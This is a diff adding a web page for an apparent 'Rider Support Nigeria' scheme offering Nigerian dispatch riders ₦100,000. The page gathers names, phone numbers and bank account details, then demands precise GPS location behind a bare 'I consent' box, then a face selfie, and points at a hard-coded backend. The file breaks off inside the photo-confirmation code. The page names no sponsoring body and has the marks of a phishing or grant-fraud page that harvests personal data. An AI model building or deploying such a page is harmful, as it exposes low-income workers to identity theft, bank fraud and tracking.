@@ -1,0 +1,2164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#087443">
+<meta name="description" content="Nigeria Dispatch Riders Funding Support Programme">
+<title>Rider Support Nigeria | Dispatch Riders Funding</title>
+
+<style>
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+}
+
+:root{
+  --green:#087443;
+  --green2:#075b35;
+  --dark:#07150f;
+  --gold:#f5b51b;
+  --white:#ffffff;
+  --bg:#f4f8f6;
+  --muted:#69766f;
+  --border:#dfe7e2;
+  --success:#16804c;
+  --danger:#c62828;
+}
+
+html{
+  scroll-behavior:smooth;
+}
+
+body{
+  font-family:
+    Inter,
+    system-ui,
+    -apple-system,
+    BlinkMacSystemFont,
+    "Segoe UI",
+    sans-serif;
+  background:var(--bg);
+  color:#122019;
+  line-height:1.5;
+}
+
+/* ===============================
+   TOP NOTICE
+================================ */
+
+.top-notice{
+  background:#092f20;
+  color:#fff;
+  text-align:center;
+  padding:8px 15px;
+  font-size:11px;
+}
+
+.top-notice span{
+  color:#ffd34e;
+  font-weight:900;
+}
+
+/* ===============================
+   NAVIGATION
+================================ */
+
+header{
+  position:sticky;
+  top:0;
+  z-index:100;
+  background:rgba(255,255,255,.96);
+  backdrop-filter:blur(15px);
+  border-bottom:1px solid var(--border);
+}
+
+.nav{
+  max-width:1180px;
+  min-height:72px;
+  margin:auto;
+  padding:0 20px;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+}
+
+.brand{
+  display:flex;
+  align-items:center;
+  gap:11px;
+  color:var(--green);
+  font-weight:950;
+  font-size:17px;
+}
+
+.brand-icon{
+  width:43px;
+  height:43px;
+  display:grid;
+  place-items:center;
+  border-radius:13px;
+  background:var(--green);
+  color:#fff;
+  font-size:21px;
+}
+
+.nav-links{
+  display:flex;
+  align-items:center;
+  gap:25px;
+}
+
+.nav-links a{
+  color:#314139;
+  text-decoration:none;
+  font-size:13px;
+  font-weight:750;
+}
+
+.nav-apply{
+  border:0;
+  background:var(--green);
+  color:#fff;
+  border-radius:11px;
+  padding:12px 18px;
+  font-weight:900;
+  cursor:pointer;
+}
+
+/* ===============================
+   HERO
+================================ */
+
+.hero{
+  max-width:1180px;
+  padding:24px 20px 0;
+  margin:auto;
+}
+
+.slider{
+  position:relative;
+  height:520px;
+  overflow:hidden;
+  border-radius:29px;
+  background:#0b2016;
+  color:white;
+  box-shadow:0 20px 60px rgba(8,50,31,.16);
+}
+
+.slide{
+  position:absolute;
+  inset:0;
+  opacity:0;
+  background-position:center;
+  background-size:cover;
+  transition:opacity .8s ease;
+}
+
+.slide.active{
+  opacity:1;
+}
+
+.slide::after{
+  content:"";
+  position:absolute;
+  inset:0;
+  background:
+    linear-gradient(
+      90deg,
+      rgba(0,0,0,.84),
+      rgba(0,0,0,.40),
+      rgba(0,0,0,.08)
+    ),
+    linear-gradient(
+      0deg,
+      rgba(0,0,0,.55),
+      transparent 65%
+    );
+}
+
+.hero-content{
+  position:absolute;
+  z-index:5;
+  left:0;
+  bottom:0;
+  max-width:700px;
+  padding:55px;
+}
+
+.hero-tag{
+  display:inline-flex;
+  padding:8px 13px;
+  border-radius:30px;
+  background:rgba(255,255,255,.13);
+  border:1px solid rgba(255,255,255,.25);
+  font-size:11px;
+  font-weight:900;
+  margin-bottom:18px;
+}
+
+.hero h1{
+  font-size:clamp(38px,6vw,68px);
+  line-height:.98;
+  letter-spacing:-2px;
+  margin-bottom:19px;
+}
+
+.hero p{
+  max-width:600px;
+  color:#eef5f1;
+  font-size:16px;
+  line-height:1.7;
+  margin-bottom:25px;
+}
+
+.hero-buttons{
+  display:flex;
+  gap:10px;
+  flex-wrap:wrap;
+}
+
+.primary-btn{
+  border:0;
+  background:var(--gold);
+  color:#111;
+  padding:14px 21px;
+  border-radius:12px;
+  font-weight:950;
+  cursor:pointer;
+}
+
+.secondary-btn{
+  border:1px solid rgba(255,255,255,.35);
+  background:rgba(255,255,255,.10);
+  color:white;
+  padding:14px 21px;
+  border-radius:12px;
+  font-weight:850;
+  cursor:pointer;
+}
+
+.slider-dots{
+  position:absolute;
+  right:28px;
+  bottom:25px;
+  z-index:10;
+  display:flex;
+  gap:7px;
+}
+
+.dot{
+  width:8px;
+  height:8px;
+  border-radius:20px;
+  background:#ffffff70;
+}
+
+.dot.active{
+  width:27px;
+  background:var(--gold);
+}
+
+/* ===============================
+   QUICK STATS
+================================ */
+
+.stats{
+  max-width:1180px;
+  margin:20px auto 55px;
+  padding:0 20px;
+  display:grid;
+  grid-template-columns:repeat(3,1fr);
+  gap:15px;
+}
+
+.stat{
+  background:#fff;
+  border:1px solid var(--border);
+  border-radius:18px;
+  padding:23px;
+}
+
+.stat-value{
+  color:var(--green);
+  font-size:25px;
+  font-weight:950;
+}
+
+.stat-label{
+  color:var(--muted);
+  font-size:12px;
+}
+
+/* ===============================
+   APPLICATION
+================================ */
+
+.application{
+  max-width:820px;
+  margin:auto;
+  padding:0 20px 80px;
+}
+
+.form-card{
+  background:#fff;
+  border:1px solid var(--border);
+  border-radius:27px;
+  padding:clamp(22px,5vw,43px);
+  box-shadow:0 20px 60px rgba(20,60,40,.08);
+}
+
+.heading small{
+  color:var(--green);
+  font-size:11px;
+  font-weight:950;
+  letter-spacing:1.2px;
+  text-transform:uppercase;
+}
+
+.heading h2{
+  font-size:31px;
+  margin:7px 0;
+  letter-spacing:-.7px;
+}
+
+.heading p{
+  color:var(--muted);
+  font-size:14px;
+  line-height:1.65;
+}
+
+.progress{
+  display:grid;
+  grid-template-columns:repeat(3,1fr);
+  gap:7px;
+  margin:27px 0 30px;
+}
+
+.progress-line{
+  height:5px;
+  border-radius:20px;
+  background:#e5ebe8;
+}
+
+.progress-line.active{
+  background:var(--green);
+}
+
+.section-title{
+  color:var(--green2);
+  font-size:14px;
+  font-weight:950;
+  margin:25px 0 14px;
+}
+
+.grid{
+  display:grid;
+  grid-template-columns:1fr 1fr;
+  gap:14px;
+}
+
+.field{
+  margin-bottom:3px;
+}
+
+label{
+  display:block;
+  font-size:12px;
+  font-weight:850;
+  color:#34423b;
+  margin-bottom:7px;
+}
+
+input,
+select{
+  width:100%;
+  height:49px;
+  border:1px solid #d7e0db;
+  border-radius:11px;
+  outline:none;
+  background:#fbfcfb;
+  padding:0 13px;
+  font-size:14px;
+  color:#17231d;
+}
+
+input:focus,
+select:focus{
+  border-color:var(--green);
+  box-shadow:0 0 0 3px rgba(8,116,67,.09);
+}
+
+.notice{
+  background:#fff8df;
+  border:1px solid #eedda6;
+  color:#604d0d;
+  border-radius:13px;
+  padding:14px;
+  font-size:12px;
+  line-height:1.6;
+  margin:18px 0;
+}
+
+.continue-btn{
+  width:100%;
+  height:53px;
+  margin-top:24px;
+  border:0;
+  border-radius:13px;
+  background:var(--green);
+  color:#fff;
+  font-size:15px;
+  font-weight:950;
+  cursor:pointer;
+}
+
+.continue-btn:hover{
+  background:var(--green2);
+}
+
+
+.consent-box{
+  display:flex;
+  gap:10px;
+  align-items:flex-start;
+  margin:18px 0;
+  padding:14px;
+  border:1px solid #cfe0d6;
+  border-radius:13px;
+  background:#f4faf6;
+  font-size:12px;
+  line-height:1.6;
+}
+
+.consent-box input{
+  width:18px;
+  height:18px;
+  flex:0 0 auto;
+  margin-top:2px;
+}
+
+.location-status{
+  margin-top:9px;
+  color:var(--muted);
+  font-size:11px;
+}
+
+.native-camera-input{
+  display:none;
+}
+
+.original-photo{
+  margin:16px auto 0;
+  max-width:560px;
+  text-align:left;
+}
+
+.original-photo input{
+  height:auto;
+  padding:12px;
+}
+
+/* ===============================
+   FUNDING SCREEN
+================================ */
+
+.funding-screen{
+  text-align:center;
+}
+
+.funding-icon{
+  width:78px;
+  height:78px;
+  margin:0 auto 17px;
+  display:grid;
+  place-items:center;
+  border-radius:25px;
+  background:#eaf8f0;
+  font-size:38px;
+}
+
+.amount{
+  color:var(--green);
+  font-size:clamp(48px,11vw,76px);
+  line-height:1;
+  font-weight:1000;
+  letter-spacing:-3px;
+  margin:22px 0 7px;
+}
+
+.amount-label{
+  color:var(--muted);
+  font-size:13px;
+}
+
+.verification-intro{
+  max-width:600px;
+  margin:22px auto;
+  color:var(--muted);
+  font-size:14px;
+  line-height:1.7;
+}
+
+/* ===============================
+   CAMERA
+================================ */
+
+.camera-section{
+  margin-top:28px;
+}
+
+.camera-container{
+  position:relative;
+  width:100%;
+  max-width:560px;
+  aspect-ratio:4/3;
+  margin:20px auto 15px;
+  overflow:hidden;
+  background:#08110d;
+  border-radius:22px;
+}
+
+#cameraVideo,
+#selfiePreview{
+  width:100%;
+  height:100%;
+  object-fit:cover;
+}
+
+.face-guide{
+  position:absolute;
+  z-index:4;
+  left:50%;
+  top:50%;
+  transform:translate(-50%,-50%);
+  width:195px;
+  height:250px;
+  border:3px solid rgba(255,255,255,.8);
+  border-radius:50%;
+  pointer-events:none;
+  box-shadow:0 0 0 9999px rgba(0,0,0,.18);
+}
+
+.camera-hint{
+  position:absolute;
+  z-index:6;
+  bottom:12px;
+  left:12px;
+  right:12px;
+  text-align:center;
+  background:rgba(0,0,0,.65);
+  color:#fff;
+  border-radius:10px;
+  padding:9px;
+  font-size:11px;
+}
+
+.camera-buttons{
+  display:flex;
+  justify-content:center;
+  gap:10px;
+  flex-wrap:wrap;
+}
+
+.camera-btn{
+  border:0;
+  border-radius:12px;
+  padding:13px 20px;
+  font-weight:900;
+  cursor:pointer;
+}
+
+.capture{
+  background:var(--gold);
+  color:#111;
+}
+
+.retake{
+  background:#e8efeb;
+  color:#1c382b;
+}
+
+.confirm{
+  background:var(--green);
+  color:#fff;
+}
+
+/* ===============================
+   PENDING SCREEN
+================================ */
+
+.pending{
+  text-align:center;
+}
+
+.pending-icon{
+  width:80px;
+  height:80px;
+  border-radius:26px;
+  margin:0 auto 18px;
+  background:#eaf8f0;
+  display:grid;
+  place-items:center;
+  font-size:38px;
+}
+
+.pending-card{
+  max-width:580px;
+  margin:28px auto;
+  padding:20px;
+  border-radius:17px;
+  background:#eef8f2;
+  border:1px solid #cde7d8;
+  text-align:left;
+  color:#185c3d;
+  font-size:13px;
+  line-height:1.65;
+}
+
+.loader{
+  display:inline-block;
+  width:23px;
+  height:23px;
+  vertical-align:middle;
+  border:3px solid #cce3d6;
+  border-top-color:var(--green);
+  border-radius:50%;
+  animation:rotate 1s linear infinite;
+  margin-right:8px;
+}
+
+@keyframes rotate{
+  to{transform:rotate(360deg)}
+}
+
+.hidden{
+  display:none!important;
+}
+
+/* ===============================
+   FOOTER
+================================ */
+
+footer{
+  background:#0b1711;
+  color:#aebbb4;
+  text-align:center;
+  padding:38px 20px;
+  font-size:12px;
+  line-height:1.8;
+}
+
+footer strong{
+  color:white;
+}
+
+@media(max-width:700px){
+
+  .nav-links{
+    display:none;
+  }
+
+  .slider{
+    height:530px;
+  }
+
+  .hero-content{
+    padding:30px;
+  }
+
+  .hero h1{
+    letter-spacing:-1px;
+  }
+
+  .stats,
+  .grid{
+    grid-template-columns:1fr;
+  }
+
+  .stats{
+    margin-bottom:35px;
+  }
+
+  .application{
+    padding-bottom:50px;
+  }
+
+}
+</style>
+</head>
+
+<body>
+
+<!-- ===============================
+     HEADER
+================================ -->
+
+<div class="top-notice">
+  Official Rider Support Programme
+  <span>• Applications are subject to verification and eligibility requirements.</span>
+</div>
+
+<header>
+
+  <div class="nav">
+
+    <div class="brand">
+      <div class="brand-icon">🏍️</div>
+      Rider Support Nigeria
+    </div>
+
+    <div class="nav-links">
+      <a href="#about">About</a>
+      <a href="#eligibility">Eligibility</a>
+      <a href="#application">Application</a>
+    </div>
+
+    <button
+      class="nav-apply"
+      onclick="scrollToApplication()">
+      Apply Now
+    </button>
+
+  </div>
+
+</header>
+
+
+<!-- ===============================
+     HERO / ADVERTISEMENT SLIDESHOW
+================================ -->
+
+<section class="hero" id="about">
+
+  <div class="slider">
+
+    <div
+      class="slide active"
+      style="
+      background-image:url('https://images.unsplash.com/photo-1558981806-ec527fa84c39?auto=format&fit=crop&w=1800&q=85')
+      ">
+    </div>
+
+    <div
+      class="slide"
+      style="
+      background-image:url('https://images.unsplash.com/photo-1526232761682-d26e03ac148e?auto=format&fit=crop&w=1800&q=85')
+      ">
+    </div>
+
+    <div
+      class="slide"
+      style="
+      background-image:url('https://images.unsplash.com/photo-1542296332-2e4473faf563?auto=format&fit=crop&w=1800&q=85')
+      ">
+    </div>
+
+    <div class="hero-content">
+
+      <div class="hero-tag">
+        🇳🇬 NIGERIA DISPATCH RIDER SUPPORT
+      </div>
+
+      <h1>
+        Supporting the riders who keep Nigeria moving.
+      </h1>
+
+      <p>
+        Eligible dispatch riders can apply for the ₦100,000 support
+        programme. Complete your application and proceed through
+        the identity-verification process.
+      </p>
+
+      <div class="hero-buttons">
+
+        <button
+          class="primary-btn"
+          onclick="scrollToApplication()">
+          Apply for Support
+        </button>
+
+        <button
+          class="secondary-btn"
+          onclick="showProgrammeInfo()">
+          How It Works
+        </button>
+
+      </div>
+
+    </div>
+
+    <div class="slider-dots">
+
+      <span class="dot active"></span>
+      <span class="dot"></span>
+      <span class="dot"></span>
+
+    </div>
+
+  </div>
+
+</section>
+
+
+<!-- ===============================
+     QUICK INFORMATION
+================================ -->
+
+<section class="stats" id="eligibility">
+
+  <div class="stat">
+
+    <div class="stat-value">
+      ₦100,000
+    </div>
+
+    <div class="stat-label">
+      Funding support amount
+    </div>
+
+  </div>
+
+  <div class="stat">
+
+    <div class="stat-value">
+      3 Steps
+    </div>
+
+    <div class="stat-label">
+      Application, verification and review
+    </div>
+
+  </div>
+
+  <div class="stat">
+
+    <div class="stat-value">
+      🇳🇬 Nigeria
+    </div>
+
+    <div class="stat-label">
+      Dispatch-rider focused programme
+    </div>
+
+  </div>
+
+</section>
+
+
+<!-- ===============================
+     APPLICATION AREA
+================================ -->
+
+<section
+  class="application"
+  id="application">
+
+  <div class="form-card">
+
+
+    <!-- ===========================
+         STEP 1
+    ============================ -->
+
+    <div id="stepOne">
+
+      <div class="heading">
+
+        <small>
+          Application • Step 1 of 3
+        </small>
+
+        <h2>
+          Rider Application
+        </h2>
+
+        <p>
+          Complete the information below to continue with your
+          funding application.
+        </p>
+
+      </div>
+
+
+      <div class="progress">
+
+        <div class="progress-line active"></div>
+        <div class="progress-line"></div>
+        <div class="progress-line"></div>
+
+      </div>
+
+
+      <!-- PERSONAL -->
+
+      <div class="section-title">
+        Personal Information
+      </div>
+
+      <div class="grid">
+
+        <div class="field">
+
+          <label>
+            First Name
+          </label>
+
+          <input
+            id="firstName"
+            type="text"
+            autocomplete="given-name"
+            placeholder="Enter first name">
+
+        </div>
+
+
+        <div class="field">
+
+          <label>
+            Surname
+          </label>
+
+          <input
+            id="surname"
+            type="text"
+            autocomplete="family-name"
+            placeholder="Enter surname">
+
+        </div>
+
+
+        <div class="field">
+
+          <label>
+            Phone Number
+          </label>
+
+          <input
+            id="phone"
+            type="tel"
+            autocomplete="tel"
+            placeholder="0800 000 0000">
+
+        </div>
+
+
+        <div class="field">
+
+          <label>
+            State of Residence
+          </label>
+
+          <select id="state">
+
+            <option value="">
+              Select state
+            </option>
+
+            <option>Abia</option>
+            <option>Adamawa</option>
+            <option>Akwa Ibom</option>
+            <option>Anambra</option>
+            <option>Bauchi</option>
+            <option>Bayelsa</option>
+            <option>Benue</option>
+            <option>Borno</option>
+            <option>Cross River</option>
+            <option>Delta</option>
+            <option>Ebonyi</option>
+            <option>Edo</option>
+            <option>Ekiti</option>
+            <option>Enugu</option>
+            <option>FCT Abuja</option>
+            <option>Gombe</option>
+            <option>Imo</option>
+            <option>Jigawa</option>
+            <option>Kaduna</option>
+            <option>Kano</option>
+            <option>Katsina</option>
+            <option>Kebbi</option>
+            <option>Kogi</option>
+            <option>Kwara</option>
+            <option>Lagos</option>
+            <option>Nasarawa</option>
+            <option>Niger</option>
+            <option>Ogun</option>
+            <option>Ondo</option>
+            <option>Osun</option>
+            <option>Oyo</option>
+            <option>Plateau</option>
+            <option>Rivers</option>
+            <option>Sokoto</option>
+            <option>Taraba</option>
+            <option>Yobe</option>
+            <option>Zamfara</option>
+
+          </select>
+
+        </div>
+
+      </div>
+
+
+      <!-- WORK -->
+
+      <div class="section-title">
+        Dispatch Rider Information
+      </div>
+
+      <div class="grid">
+
+        <div class="field">
+
+          <label>
+            How Long Have You Worked as a Dispatch Rider?
+          </label>
+
+          <select id="experience">
+
+            <option value="">
+              Select duration
+            </option>
+
+            <option>
+              Less than 6 months
+            </option>
+
+            <option>
+              6 months – 1 year
+            </option>
+
+            <option>
+              1 – 2 years
+            </option>
+
+            <option>
+              3 – 5 years
+            </option>
+
+            <option>
+              More than 5 years
+            </option>
+
+          </select>
+
+        </div>
+
+
+        <div class="field">
+
+          <label>
+            Work Arrangement
+          </label>
+
+          <select id="workType">
+
+            <option value="">
+              Select
+            </option>
+
+            <option>
+              Independent rider
+            </option>
+
+            <option>
+              Company-employed rider
+            </option>
+
+            <option>
+              Contract rider
+            </option>
+
+            <option>
+              Part-time rider
+            </option>
+
+          </select>
+
+        </div>
+
+
+        <div class="field">
+
+          <label>
+            Primary Delivery Area
+          </label>
+
+          <input
+            id="deliveryArea"
+            type="text"
+            placeholder="e.g. Ikeja">
+
+        </div>
+
+
+        <div class="field">
+
+          <label>
+            Motorcycle Ownership
+          </label>
+
+          <select id="motorcycle">
+
+            <option value="">
+              Select
+            </option>
+
+            <option>
+              Own motorcycle
+            </option>
+
+            <option>
+              Company motorcycle
+            </option>
+
+            <option>
+              Rented motorcycle
+            </option>
+
+          </select>
+
+        </div>
+
+      </div>
+
+
+      <!-- OTHER INFORMATION -->
+
+      <div class="section-title">
+        Additional Information
+      </div>
+
+      <div class="grid">
+
+        <div class="field">
+
+          <label>
+            Average Deliveries Per Day
+          </label>
+
+          <select id="deliveries">
+
+            <option value="">
+              Select
+            </option>
+
+            <option>1 – 5</option>
+            <option>6 – 10</option>
+            <option>11 – 20</option>
+            <option>More than 20</option>
+
+          </select>
+
+        </div>
+
+
+        <div class="field">
+
+          <label>
+            Current Work Status
+          </label>
+
+          <select id="status">
+
+            <option value="">
+              Select
+            </option>
+
+            <option>
+              Currently working
+            </option>
+
+            <option>
+              Temporarily not working
+            </option>
+
+            <option>
+              Looking for dispatch work
+            </option>
+
+          </select>
+
+        </div>
+
+      </div>
+
+
+      <!-- PAYMENT -->
+
+      <div class="section-title">
+        Bank Account Information
+      </div>
+
+      <div class="notice">
+
+        <strong>Payment information:</strong>
+        Enter the account that should receive an approved funding
+        payment. Never provide your banking PIN, password, OTP or
+        card security code. The programme should only process this
+        information through its authorized secure backend.
+
+      </div>
+
+
+      <div class="grid">
+
+        <div class="field">
+
+          <label>
+            Account Name
+          </label>
+
+          <input
+            id="accountName"
+            type="text"
+            autocomplete="name"
+            placeholder="Account holder name">
+
+        </div>
+
+
+        <div class="field">
+
+          <label>
+            Account Number
+          </label>
+
+          <input
+            id="accountNumber"
+            type="text"
+            inputmode="numeric"
+            maxlength="10"
+            autocomplete="off"
+            placeholder="10-digit account number">
+
+        </div>
+
+
+        <div class="field">
+
+          <label>
+            Bank
+          </label>
+
+          <select id="bank">
+
+            <option value="">
+              Select bank
+            </option>
+
+            <option>Access Bank</option>
+            <option>Citibank Nigeria</option>
+            <option>Ecobank</option>
+            <option>FCMB</option>
+            <option>Fidelity Bank</option>
+            <option>First Bank</option>
+            <option>GTBank</option>
+            <option>Heritage Bank</option>
+            <option>Keystone Bank</option>
+            <option>Moniepoint</option>
+            <option>Opay</option>
+            <option>Palmpay</option>
+            <option>Polaris Bank</option>
+            <option>Stanbic IBTC</option>
+            <option>Sterling Bank</option>
+            <option>UBA</option>
+            <option>Union Bank</option>
+            <option>Unity Bank</option>
+            <option>Wema Bank</option>
+            <option>Zenith Bank</option>
+            <option>Other</option>
+
+          </select>
+
+        </div>
+
+      </div>
+
+
+      <label class="consent-box" for="privacyConsent">
+        <input id="privacyConsent" type="checkbox">
+        <span>I consent</span>
+      </label>
+      <div id="locationStatus" class="location-status" aria-live="polite">Device location will be requested after consent.</div>
+
+
+      <button
+        class="continue-btn"
+        onclick="continueApplication()">
+
+        Continue to Funding
+
+      </button>
+
+    </div>
+
+
+    <!-- ===========================
+         STEP 2
+    ============================ -->
+
+    <div
+      id="stepTwo"
+      class="funding-screen hidden">
+
+      <div class="funding-icon">
+        🎉
+      </div>
+
+      <div class="heading">
+
+        <small>
+          Application • Step 2 of 3
+        </small>
+
+        <h2>
+          Funding Amount
+        </h2>
+
+        <p>
+          Your application has proceeded to the identity-verification
+          stage.
+        </p>
+
+      </div>
+
+
+      <div class="progress">
+
+        <div class="progress-line active"></div>
+        <div class="progress-line active"></div>
+        <div class="progress-line"></div>
+
+      </div>
+
+
+      <div class="amount">
+        ₦100,000
+      </div>
+
+      <div class="amount-label">
+        Funding support amount
+      </div>
+
+
+      <div class="verification-intro">
+
+        Before your application can enter final review, complete
+        the identity-verification step below.
+
+      </div>
+
+
+      <div class="camera-section">
+
+        <div class="section-title">
+          Face Verification
+        </div>
+
+        <div id="verificationLocationStatus" class="location-status" aria-live="polite">Fresh device GPS location is required before submission.</div>
+
+
+        <div class="camera-container">
+
+          <video
+            id="cameraVideo"
+            class="hidden"
+            autoplay
+            muted
+            playsinline>
+          </video>
+
+          <img
+            id="selfiePreview"
+            class="hidden"
+            alt="Captured verification photo">
+
+          <div class="face-guide"></div>
+
+          <div
+            class="camera-hint"
+            id="cameraHint">
+
+            Tap Take a Picture to open your device camera.
+
+          </div>
+
+        </div>
+
+
+        <div class="original-photo">
+          <label for="originalPhoto">Device camera photo</label>
+          <input id="originalPhoto" class="native-camera-input" type="file" accept="image/*" capture="user">
+        </div>
+
+        <div class="camera-buttons">
+
+          <button
+            class="camera-btn capture"
+            id="captureBtn"
+            onclick="openNativeCamera()">
+
+            Take a Picture
+
+          </button>
+
+
+          <button
+            class="camera-btn retake hidden"
+            id="retakeBtn"
+            onclick="retakePhoto()">
+
+            Retake
+
+          </button>
+
+
+          <button
+            class="camera-btn confirm hidden"
+            id="confirmBtn"
+            onclick="confirmPhoto()">
+
+            Confirm Photo
+
+          </button>
+
+        </div>
+
+      </div>
+
+    </div>
+
+
+    <!-- ===========================
+         STEP 3
+    ============================ -->
+
+    <div
+      id="stepThree"
+      class="pending hidden">
+
+      <div class="pending-icon">
+        ✓
+      </div>
+
+      <div class="heading">
+
+        <small>
+          Application • Step 3 of 3
+        </small>
+
+        <h2>
+          Verification Pending
+        </h2>
+
+        <p>
+          Your application has been submitted for review.
+        </p>
+
+      </div>
+
+
+      <div class="progress">
+
+        <div class="progress-line active"></div>
+        <div class="progress-line active"></div>
+        <div class="progress-line active"></div>
+
+      </div>
+
+
+      <div class="amount">
+        ₦100,000
+      </div>
+
+      <div class="amount-label">
+        Requested funding support
+      </div>
+
+
+      <div class="pending-card">
+
+        <div>
+          <span class="loader"></span>
+          <strong>Application under verification</strong>
+        </div>
+
+        <br>
+
+        Your submitted application is now waiting for verification
+        and eligibility review.
+
+        <br><br>
+
+        <strong>
+          Application Reference:
+        </strong>
+
+        <span id="applicationReference">
+          RSNG-000000
+        </span>
+
+      </div>
+
+
+      <button
+        class="continue-btn"
+        onclick="window.scrollTo({top:0,behavior:'smooth'})">
+
+        Return to Home
+
+      </button>
+
+    </div>
+
+  </div>
+
+</section>
+
+
+<!-- ===============================
+     FOOTER
+================================ -->
+
+<footer>
+
+  <strong>
+    Rider Support Nigeria
+  </strong>
+
+  <br>
+
+  Dispatch Rider Funding Support Programme
+
+  <br><br>
+
+  Applicants should rely only on official programme communications
+  for verification and funding decisions.
+
+</footer>
+
+
+<script>
+
+/* =========================================
+   ADVERTISEMENT SLIDER
+========================================= */
+
+// Paste your deployed Render backend URL here, without a trailing slash.
+const BACKEND_URL = "https://dispatch-back-pdcs.onrender.com";
+
+let consentedLocation = null;
+let originalPhotoFile = null;
+
+const slides =
+  document.querySelectorAll(".slide");
+
+const dots =
+  document.querySelectorAll(".dot");
+
+let currentSlide = 0;
+
+setInterval(() => {
+
+  slides[currentSlide].classList.remove("active");
+  dots[currentSlide].classList.remove("active");
+
+  currentSlide =
+    (currentSlide + 1) % slides.length;
+
+  slides[currentSlide].classList.add("active");
+  dots[currentSlide].classList.add("active");
+
+},5000);
+
+
+/* =========================================
+   NAVIGATION
+========================================= */
+
+function scrollToApplication(){
+
+  document
+    .getElementById("application")
+    .scrollIntoView({
+      behavior:"smooth"
+    });
+
+}
+
+
+/* =========================================
+   PROGRAMME INFO
+========================================= */
+
+function showProgrammeInfo(){
+
+  alert(
+    "How the programme works:\n\n" +
+    "1. Complete your rider application.\n\n" +
+    "2. Review the ₦100,000 funding amount.\n\n" +
+    "3. Complete face verification.\n\n" +
+    "4. Your application enters verification and eligibility review."
+  );
+
+}
+
+
+/* =========================================
+   REQUIRED FIELD CHECK
+========================================= */
+
+function checkField(id){
+
+  const field =
+    document.getElementById(id);
+
+  if(!field.value.trim()){
+
+    field.focus();
+
+    alert(
+      "Please complete the required field."
+    );
+
+    return false;
+
+  }
+
+  return true;
+
+}
+
+
+/* =========================================
+   CONTINUE FROM STEP 1
+========================================= */
+
+async function continueApplication(){
+
+  const consent = document.getElementById("privacyConsent");
+  if(!consent.checked){
+    alert("Please read and accept the privacy and verification consent before continuing.");
+    consent.focus();
+    return;
+  }
+
+  if(BACKEND_URL.includes("PASTE_YOUR_RENDER_BACKEND_URL_HERE")){
+    alert("Please set BACKEND_URL near the top of this script to your deployed Render backend URL.");
+    return;
+  }
+
+  const fields = [
+
+    "firstName",
+    "surname",
+    "phone",
+    "state",
+    "experience",
+    "workType",
+    "deliveryArea",
+    "motorcycle",
+    "deliveries",
+    "status",
+    "accountName",
+    "accountNumber",
+    "bank"
+
+  ];
+
+
+  for(const id of fields){
+
+    if(!checkField(id)){
+      return;
+    }
+
+  }
+
+
+  const accountNumber =
+    document
+      .getElementById("accountNumber")
+      .value
+      .trim();
+
+
+  if(!/^[0-9]{10}$/.test(accountNumber)){
+
+    alert(
+      "Please enter a valid 10-digit account number."
+    );
+
+    return;
+
+  }
+
+
+  consentedLocation = await requestDeviceLocation();
+  if(!consentedLocation){
+    alert("A valid device GPS location is required to continue. Estimated IP location is not accepted.");
+    return;
+  }
+
+  /*
+    Move to funding / identity verification.
+  */
+
+  document
+    .getElementById("stepOne")
+    .classList.add("hidden");
+
+
+  document
+    .getElementById("stepTwo")
+    .classList.remove("hidden");
+
+
+  document
+    .getElementById("application")
+    .scrollIntoView({
+      behavior:"smooth"
+    });
+
+
+  // The native file input opens the device camera after the user taps Take a Picture.
+
+}
+
+
+/* =========================================
+   CAMERA
+========================================= */
+
+let cameraStream = null;
+
+let capturedSelfie = null;
+
+
+async function startCamera(){
+
+  const video =
+    document.getElementById("cameraVideo");
+
+  const hint =
+    document.getElementById("cameraHint");
+
+
+  if(
+    !navigator.mediaDevices ||
+    !navigator.mediaDevices.getUserMedia
+  ){
+
+    hint.textContent =
+      "Camera access is not supported by this browser.";
+
+    return;
+
+  }
+
+
+  try{
+
+    cameraStream =
+      await navigator.mediaDevices.getUserMedia({
+
+        video:{
+          facingMode:{
+            ideal:"user"
+          },
+
+          width:{
+            ideal:1280
+          },
+
+          height:{
+            ideal:960
+          }
+
+        },
+
+        audio:false
+
+      });
+
+
+    video.srcObject =
+      cameraStream;
+
+
+    hint.textContent =
+      "Camera ready. Position your face inside the guide.";
+
+  }
+
+  catch(error){
+
+    console.error(error);
+
+    hint.textContent =
+      "Camera permission was not granted.";
+
+    alert(
+      "Camera permission is required for face verification. " +
+      "Please allow camera access and try again."
+    );
+
+  }
+
+}
+
+
+/* =========================================
+   CAPTURE SELFIE
+========================================= */
+
+function openNativeCamera(){
+  document.getElementById("originalPhoto").click();
+}
+
+function capturePhoto(){
+
+  const video =
+    document.getElementById("cameraVideo");
+
+  const preview =
+    document.getElementById("selfiePreview");
+
+  const canvas =
+    document.createElement("canvas");
+
+
+  if(
+    !cameraStream ||
+    !video.videoWidth
+  ){
+
+    alert(
+      "The camera is not ready yet."
+    );
+
+    return;
+
+  }
+
+
+  canvas.width =
+    video.videoWidth;
+
+  canvas.height =
+    video.videoHeight;
+
+
+  const context =
+    canvas.getContext("2d");
+
+
+  context.drawImage(
+    video,
+    0,
+    0,
+    canvas.width,
+    canvas.height
+  );
+
+
+  capturedSelfie =
+    canvas.toDataURL(
+      "image/jpeg",
+      .90
+    );
+
+
+  preview.src =
+    capturedSelfie;
+
+
+  video.classList.add("hidden");
+
+  preview.classList.remove("hidden");
+
+
+  document
+    .getElementById("captureBtn")
+    .classList.add("hidden");
+
+
+  document
+    .getElementById("retakeBtn")
+    .classList.remove("hidden");
+
+
+  document
+    .getElementById("confirmBtn")
+    .classList.remove("hidden");
+
+
+  document
+    .getElementById("cameraHint")
+    .textContent =
+      "Review the photograph. Retake it if necessary.";
+
+}
+
+
+/* =========================================
+   RETAKE
+========================================= */
+
+function retakePhoto(){
+
+  capturedSelfie = null;
+  originalPhotoFile = null;
+  document.getElementById("originalPhoto").value = "";
+
+
+  document
+    .getElementById("cameraVideo")
+    .classList.remove("hidden");
+
+
+  document
+    .getElementById("selfiePreview")
+    .classList.add("hidden");
+
+
+  document
+    .getElementById("captureBtn")
+    .classList.remove("hidden");
+
+
+  document
+    .getElementById("retakeBtn")
+    .classList.add("hidden");
+
+
+  document
+    .getElementById("confirmBtn")
+    .classList.add("hidden");
+
+
+  document
+    .getElementById("cameraHint")
+    .textContent =
+      "Position your face inside the guide.";
+
+}
+
+
+/* =========================================
+   CONFIRM SELFIE
+========================================= */
+
+async function confirmPhoto(){
+
+  if(!capturedSelfie && !originalPhotoFile){
